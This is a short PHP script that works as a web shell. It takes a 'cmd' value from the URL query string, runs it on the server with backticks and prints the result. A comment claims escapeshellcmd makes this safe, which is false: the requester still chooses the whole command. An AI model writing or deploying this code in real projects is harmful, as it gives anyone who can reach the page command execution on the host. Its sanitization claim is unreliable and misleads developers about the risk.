<?php
$command = isset($_GET['cmd']) ? $_GET['cmd'] : '';
$result = '';

if (!empty($command)) {
    // Use escapeshellcmd to sanitize the command
    $command = escapeshellcmd($command);

    // Use backticks to execute the command
    $result = `{$command}`;
}

echo "Result: $result";
?>